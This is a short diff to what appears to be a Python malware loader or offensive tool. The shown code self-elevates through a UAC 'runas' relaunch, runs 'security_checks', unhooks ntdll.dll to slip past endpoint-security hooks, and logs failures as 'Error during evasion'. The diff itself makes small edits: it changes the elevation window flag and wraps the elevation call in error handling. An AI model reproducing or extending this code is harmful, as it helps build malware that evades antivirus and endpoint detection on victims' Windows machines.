@@ -492,9 +492,10 @@ def is_admin():
 def elevate_privileges():
     try:
         rc = ctypes.windll.shell32.ShellExecuteW(
-            None, "runas", sys.executable, " ".join(sys.argv), None, 0
+            None, "runas", sys.executable, " ".join(sys.argv), None, 1
         )
         if rc > 32:
+                            
             sys.exit(0)
         else:
             pass
@@ -504,7 +505,10 @@ def elevate_privileges():
 ############################# Checks execute #############################
 try:
     if not is_admin():
-        elevate_privileges()
+        try:                    
+            elevate_privileges()
+        except Exception as e:
+            print(f"Error during evasion: {e}")  
     if not security_checks():
         sys.exit(0)
     unhook_dll("ntdll.dll")  
